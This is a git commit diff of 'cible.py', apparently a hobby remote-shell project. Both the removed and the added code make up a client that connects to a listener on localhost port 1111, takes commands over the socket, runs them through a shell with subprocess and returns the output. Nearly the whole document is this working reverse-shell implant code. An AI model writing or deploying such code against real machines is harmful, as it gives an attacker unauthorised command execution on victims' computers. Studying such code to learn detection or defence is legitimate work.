f5ba5cf0b6dcf23fde22aaf6d413c0a37b63b7bc
yaya7211 <43450496+yaya7211@users.noreply.github.com>
2020-01-26 18:18:51 +0100

    Update cible.py

--- cible.py
+++ cible.py
@@ -4,38 +4,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("localhost", 1111))
 
 while True:
-	out1 = err1 =""
-	a = os.getcwd()
-	a = a.encode()
-	s.send(a)
-	cmd = s.recv(1024)
-	cmd = cmd.decode()
-	if cmd.startswith("cd "):
-		try:
-			os.chdir(cmd.split(" ")[1])
-			s.send(b"Directory changed !\n")
-		except FileNotFoundError:
-			s.send(b"Le chemin d'acces est introuvable :/\n")
-
-	else:
-		back = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-		out, err = back.communicate()
-		if len(out) < 1 and len(err) > 1:
-			for element in err:
-			    element = bytes([element])
-			    try:
-			        err1 += element.decode('utf-8')
-			    except Exception as e:
-			        err1 += "?"
-			s.send(err1.encode())
-		elif len(err) < 1 and len(out) > 1:
-			for element in out:
-			    element = bytes([element])
-			    try:
-			        out1 += element.decode('utf-8')
-			    except Exception as e:
-			        out1 += "?"
-			s.send(out1.encode())
-		else:
-			s.send(b"Done !")
+    cmd = s.recv(1024).decode()
+    out, err = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE).communicate() 
+    print(out+err, cmd)
+    s.send(out+err+b"\n")
 		
